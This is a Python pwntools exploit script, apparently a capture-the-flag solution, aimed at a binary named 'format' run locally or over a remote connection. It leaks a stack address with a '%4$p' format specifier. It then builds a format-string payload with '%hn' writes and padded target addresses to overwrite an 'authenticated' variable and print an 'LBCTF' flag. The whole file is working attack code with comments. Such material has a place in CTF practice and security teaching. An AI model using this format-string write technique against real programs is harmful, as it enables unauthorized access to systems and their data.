import sys
from pwn import *

LOCAL = True
PORT = 1234
ADDR = "127.0.0.1"

def pad(payload):
  """pad the exploit to put addresses at a consistent offset"""
  return payload + b"X" * (128 - len(payload) - 16)


p = process('./format') if LOCAL else remote(ADDR, PORT)

p.recvline()
p.recvline()

# address of the buffer is fourth pointer in the arguments
# when the program calls printf
p.sendline(b"%4$p")

# address of the authenticated variable is four bytes
# before the address of the format string (sizeof(int))
FLAG_ADDR = int(p.recvline().strip(), 16) - 4
info(f"Address of authenticated: {hex(FLAG_ADDR)}")

payload = b""

# write some data
# this writes exactly 21321 or 0x5349 (little endian) characters
payload += b"%21321x"

# save written byte count to FLAG_ADDR lower half
# should be 22 and 23 from the stack, respectively
payload += b"%22$hn"

# we've written 0x5349 / 21321 bytes, but we need to have printed
# 0x5354 in order to write the other half of the flag
# so we add another 11 characters which will be printed to reach that (0x5354 - 0x5349 = 11)
payload += b"A" * 11

# write the new current count to the upper
# half of the variable
payload += b"%23$hn"

# pad the payload to 128 - 16,
# so that the addresses are always at
# that offset no matter which previous
# data we add to the format string
payload = pad(payload)


# add addresses to the end
payload += FLAG_ADDR.to_bytes(8, 'little')
payload += (FLAG_ADDR + 2).to_bytes(8, 'little')

p.sendline(payload)

success('LBCTF' + p.recvuntil(b'}').split(b'LBCTF')[-1].decode())
